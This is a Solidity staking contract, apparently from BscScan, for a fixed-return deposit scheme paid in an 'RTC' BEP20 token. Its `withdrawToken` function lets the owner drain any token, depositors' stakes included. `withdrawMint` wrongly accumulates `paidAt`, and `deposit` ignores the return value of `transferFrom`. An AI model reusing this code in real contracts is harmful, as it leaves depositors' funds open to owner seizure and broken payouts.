/**
 *Submitted for verification at BscScan.com on 2022-01-04
 */

// SPDX-License-Identifier: none
pragma solidity ^0.8.10;

interface BEP20 {
    function totalSupply() external view returns (uint256 theTotalSupply);

    function balanceOf(address _owner) external view returns (uint256 balance);

    function transfer(address _to, uint256 _value)
        external
        returns (bool success);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool success);

    function approve(address _spender, uint256 _value)
        external
        returns (bool success);

    function allowance(address _owner, address _spender)
        external
        view
        returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
}

contract TeamRijent {
    struct Tariff {
        uint256 time;
        uint256 percent;
    }

    struct Deposit {
        uint256 tariff;
        uint256 amount;
        uint256 at;
        uint256 withdrawnPrincipal;
        uint256 principalWithdrawnAt;
        uint256 nextPrincipalWithdrawalAt;
    }

    struct Investor {
        bool registered;
        Deposit[] deposits;
        uint256 invested;
        uint256 paidAt;
        uint256 withdrawn;
    }

    uint256 MIN_DEPOSIT = 50 * (10**9);
    uint256 MIN_WITHDRAWAL = 50 * (10**9);
    address public contractAddr = address(this);
    address public owner = msg.sender;
    address public token;
    bool public depositStatus;

    Tariff[] public tariffs;
    uint256 public totalInvestors;
    uint256 public totalInvested;
    uint256 public totalWithdrawal;
    mapping(address => Investor) public investors;

    event DepositAt(address user, uint256 tariff, uint256 amount);
    event Withdraw(address user, uint256 amount);
    event OwnershipTransferred(address);
    event WithdrawPrincipal(
        address user,
        uint256 amount,
        uint256 withdrawnAt,
        uint256 plan
    );

    constructor() {
        tariffs.push(Tariff(180 days, 6 * 2));
        tariffs.push(Tariff(360 days, 12 * 3));
        tariffs.push(Tariff(720 days, 24 * 5));
        tariffs.push(Tariff(1080 days, 36 * 7));
        tariffs.push(Tariff(1800 days, 60 * 9));

        token = 0x913aFbBA462d6ae230344209d0Bd11CE3CE92Ed1; // RTC Token
        owner = msg.sender;
        depositStatus = true;
    }

    function transferOwnership(address to) external {
        require(msg.sender == owner, "Only owner");
        require(to != address(0), "Cannot transfer ownership to zero address");
        owner = to;
        emit OwnershipTransferred(to);
    }

    function changeDepositStatus(bool _depositStatus) external {
        require(msg.sender == owner, " Only Owner");
        depositStatus = _depositStatus;
    }

    function deposit(uint256 tariff, uint256 amount) external {
        require(amount >= MIN_DEPOSIT);
        require(tariff < tariffs.length);
        uint256 currentTime = block.timestamp;
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;
        }

        investors[msg.sender].invested += amount;
        totalInvested += amount;

        Tariff storage tariffObj = tariffs[tariff];
        uint256 nextPrincipalWithdrawalDate = tariffObj.time + currentTime;
        investors[msg.sender].deposits.push(
            Deposit(
                tariff,
                amount,
                currentTime,
                0,
                currentTime,
                nextPrincipalWithdrawalDate
            )
        );
        BEP20 _token = BEP20(token);
        require(
            _token.balanceOf(msg.sender) >= amount,
            "Insufficient balance of user"
        );
        _token.transferFrom(msg.sender, contractAddr, amount);

        emit DepositAt(msg.sender, tariff, amount);
    }

    function withdrawPrincipal(uint256 index) external {
        Investor storage investor = investors[msg.sender];
        Deposit storage dep = investor.deposits[index];
        require(investor.registered == true, "Invalid User");
        require(
            dep.nextPrincipalWithdrawalAt <= block.timestamp,
            "Withdrawn Time not reached"
        );

        require(dep.withdrawnPrincipal < dep.amount, "No Principal Found");
        uint256 currentTime = block.timestamp;

        uint256 withdrawnAmt = (dep.amount * 10) / 100;

        BEP20 _token = BEP20(token);
        require(
            _token.balanceOf(contractAddr) >= withdrawnAmt,
            "Insufficient Contract Balance"
        );
        _token.transfer(msg.sender, withdrawnAmt);

        dep.withdrawnPrincipal += withdrawnAmt;
        dep.principalWithdrawnAt = currentTime;
        dep.nextPrincipalWithdrawalAt = currentTime + 7 days;

        emit WithdrawPrincipal(msg.sender, withdrawnAmt, currentTime, index);
    }

    function withdrawMint() external {
        require(investors[msg.sender].registered == true, "Invalid User");
        uint256 amount = withdrawableMint(msg.sender);
        require(amount >= MIN_WITHDRAWAL, "Minimum Withdraw Limit Exceed");
        BEP20 _token = BEP20(token);
        require(
            _token.balanceOf(contractAddr) >= amount,
            "Insufficient Contract Balance"
        );
        if (_token.transfer(msg.sender, amount)) {
            investors[msg.sender].withdrawn += amount;
            investors[msg.sender].paidAt += block.timestamp;
            totalWithdrawal += amount;

            emit Withdraw(msg.sender, amount);
        }
    }

    function withdrawalToAddress(address payable to, uint256 amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
    }

    // Only owner can withdraw token
    function withdrawToken(
        address tokenAddress,
        address to,
        uint256 amount
    ) external {
        require(msg.sender == owner, "Only owner");
        BEP20 tokenNew = BEP20(tokenAddress);
        tokenNew.transfer(to, amount);
    }

    function withdrawableMint(address user)
        public
        view
        returns (uint256 amount)
    {
        Investor storage investor = investors[user];

        for (uint256 i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
            Tariff storage tariff = tariffs[dep.tariff];

            uint256 finish = dep.at + tariff.time;
            uint256 since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
            uint256 till = block.timestamp > finish ? finish : block.timestamp;

            if (since < till) {
                amount +=
                    (dep.amount * (till - since) * tariff.percent) /
                    tariff.time /
                    100;
            }
        }
    }

    /// Show Package Details
    function packageDetails(address addr)
        public
        view
        returns (
            bool isRegsitered,
            uint256[] memory packageAmt,
            uint256[] memory planType,
            uint256[] memory purchaseAt,
            uint256[] memory withdrawnPrincipalAmt,
            uint256[] memory withdrawnPrincipalAt,
            uint256[] memory nextWithdrawnPrincipalAt,
            bool[] memory withdrawBtn
        )
    {
        Investor storage investor = investors[addr];

        uint256 len = investor.deposits.length;
        packageAmt = new uint256[](len);
        planType = new uint256[](len);
        purchaseAt = new uint256[](len);
        withdrawnPrincipalAmt = new uint256[](len);
        withdrawnPrincipalAt = new uint256[](len);
        nextWithdrawnPrincipalAt = new uint256[](len);
        withdrawBtn = new bool[](len);
        for (uint256 i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];

            packageAmt[i] = dep.amount;
            planType[i] = dep.tariff;
            purchaseAt[i] = dep.at;
            withdrawnPrincipalAmt[i] = dep.withdrawnPrincipal;
            withdrawnPrincipalAt[i] = dep.principalWithdrawnAt;
            nextWithdrawnPrincipalAt[i] = dep.nextPrincipalWithdrawalAt;
            withdrawBtn[i] = (dep.nextPrincipalWithdrawalAt < block.timestamp &&
                dep.amount > dep.withdrawnPrincipal)
                ? true
                : false;
        }
        return (
            investor.registered,
            packageAmt,
            planType,
            purchaseAt,
            withdrawnPrincipalAmt,
            withdrawnPrincipalAt,
            nextWithdrawnPrincipalAt,
            withdrawBtn
        );
    }
}
